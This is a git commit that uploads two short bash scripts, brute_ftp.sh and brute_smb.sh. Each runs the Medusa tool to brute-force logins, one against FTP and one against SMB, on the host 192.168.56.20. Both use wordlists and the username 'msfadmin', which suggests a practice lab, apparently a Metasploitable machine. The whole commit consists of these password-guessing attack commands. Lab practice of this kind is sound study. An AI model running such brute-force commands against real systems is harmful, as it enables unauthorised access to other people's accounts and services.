373da57b3bc92fef23e1bd750832968c2c580051
He11m0d <74564172+He11m0d@users.noreply.github.com>
2025-11-30 08:39:42 -0300

    Add files via upload

---
+++ brute_ftp.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+medusa -h 192.168.56.20 -u msfadmin -P ./wordlists/passwords.txt -M ftp
---
+++ brute_smb.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+medusa -h 192.168.56.20 -U ./wordlists/users.txt -p msfadmin -M smbnt
